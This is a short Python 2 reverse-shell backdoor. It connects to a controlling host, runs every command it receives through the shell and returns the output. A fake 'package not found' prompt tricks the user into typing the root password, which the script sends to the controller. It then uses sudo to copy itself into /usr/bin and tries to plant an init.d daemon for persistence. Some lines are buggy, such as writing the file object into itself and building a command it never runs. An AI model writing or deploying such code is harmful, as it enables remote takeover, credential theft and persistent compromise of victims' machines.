#-*- coding:utf-8 -*-
import socket,subprocess,getpass,os


def connection():
    host = "127.0.0.1"
    port = 8080
    buff = 2048
    global client_socket
    client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    client_socket.connect((host,port))
    get_root_passwd()
    while True:

        received_data = client_socket.recv(buff)
        if received_data == 'quit' :
            client_socket.close()
        else :
            command = subprocess.check_output(received_data, shell=True)
            if not command:
                client_socket.send("Command succesfully executed.")
            else:
                client_socket.send(str(command) + "\nCommand succesfully executed.")

def get_root_passwd():
    prompt = "Python built-in package \"colorize\" not found. Trying to install...\nRoot password required: "
    password = getpass.getpass(prompt)
    client_socket.send("P4SSW0RD:" +str(password + "\n" +str(client_socket.getpeername())))
    cjinj = "echo %s | sudo -S cp rshell_client.py /usr/bin" %str(password)
    command = subprocess.check_output(cjinj, shell=True)
    daemon = client_socket.recv(2048)
    fileopen = open("daemonize.sh","wb")
    fileopen.write(fileopen)
    fileopen.close()
    djinj = "echo %s | sudo -S mv daemonize.sh /etc/init.d/" %(str(password))
connection()
